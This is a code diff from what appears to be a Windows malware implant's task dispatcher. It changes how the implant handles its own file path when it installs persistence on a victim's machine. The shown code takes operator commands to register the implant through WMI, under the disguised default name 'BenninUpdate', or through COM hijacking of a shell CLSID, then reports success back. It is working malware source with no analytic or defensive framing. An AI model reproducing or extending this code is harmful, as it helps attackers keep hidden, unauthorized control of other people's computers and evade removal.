@@ -259,19 +259,21 @@ void TaskDispatcher::dispatch(const Task& task) {
             case TaskType::ADV_PERSISTENCE: {
                 // Cmd format: "wmi install [name]" or "com install [clsid]"
                 std::string cmd = task.cmd;
-                char implantPath[MAX_PATH];
-                GetModuleFileNameA(NULL, implantPath, MAX_PATH);
+                wchar_t implantPath[MAX_PATH];
+                GetModuleFileNameW(NULL, implantPath, MAX_PATH);
+                std::wstring wImplantPath(implantPath);
 
                 if (cmd.find("wmi install") == 0) {
                     std::string name = "BenninUpdate";
                     if (cmd.length() > 12) name = cmd.substr(12);
-                    if (persistence::WmiPersistence::Install(implantPath, name))
+                    std::wstring wName = utils::s2ws(name);
+                    if (persistence::WmiPersistence::Install(wImplantPath, wName))
                         result.output = "ADV_PERSISTENCE:WMI installed as " + name;
                     else result.error = "WMI install failed";
                 } else if (cmd.find("com install") == 0) {
                     std::string clsid = "{00021400-0000-0000-C000-000000000046}"; // Folder Background
                     if (cmd.length() > 12) clsid = cmd.substr(12);
-                    if (persistence::ComHijacker::Install(utils::s2ws(implantPath), utils::s2ws(clsid)))
+                    if (persistence::ComHijacker::Install(wImplantPath, utils::s2ws(clsid)))
                         result.output = "ADV_PERSISTENCE:COM hijacking installed for " + clsid;
                     else result.error = "COM install failed";
                 }
